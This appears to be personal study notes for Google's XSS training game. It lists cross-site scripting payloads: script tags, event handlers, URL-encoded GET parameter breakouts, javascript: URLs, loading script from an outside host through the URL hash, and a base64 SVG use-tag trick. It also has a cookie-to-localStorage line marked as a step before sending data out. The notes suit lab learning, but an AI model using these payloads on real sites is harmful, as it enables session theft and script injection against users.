### General

- Use `alert(document.domain)` instead of `alert(1)` to see exact domain with xss


### With script tag
- Enter search input: <script>alert(123)</script> or %3cscript%3ealert(document.cookie)%3c/script%3e
- <script>localStorage.setItem('Bob', document.cookie)</script>
<!-- Next step would be send ajax request -->


### With tag js attribute
- Post to comments: <b onmouseover="alert('XSS testing!')"></b>


### Location hash is executed from app js script
- https://xss-game.appspot.com/level3/frame#'/><script>alert(1)</script>
                                            ^^^ close image tag and perform script

### Inject to GET param of request

Escape codes: https://www.w3schools.com/tags/ref_urlencode.ASP
'	%27
(	%28
)	%29
;	%3B

- https://xss-game.appspot.com/level4/frame?timer='%2Balert(1)%2B'

<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" /> -----> <img src="/static/loading.gif" onload="startTimer('' + alert(1) + '');">

### JS could be executed with `javascript:` within tag

https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)


/confirm?next=%27%3Balert%281%29%3B%27
              '  ;alert(1);'

setTimeout(function() { window.location = '{{ next }}'; }, 5000);
                                          ^^
setTimeout(function() { window.location = '';alert(1);''; }, 5000);


### JS could be loaded from hash (if there is such logic)

- `https://xss-game.appspot.com/level6/frame#//progsmile.github.io/learn/xss/index.js`

### Load JS via SVG use tag

```html
<svg><use href="dAta:image/s    vg+xml;base64,PHN2ZyBpZD0ieDIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+IDxpbWFnZSBocmVmPSJ4IiBvbmVycm9yPSJhbGVydCgyMzQpIiAvPjwvc3ZnPg==#x2">
```
\\/\\/\\/\\/\\/\\/\\/\\/\\/
```html
<svg id="x2" xmlns="http://www.w3.org/2000/svg"> <image href="x" onerror="alert(234)" /></svg>
```
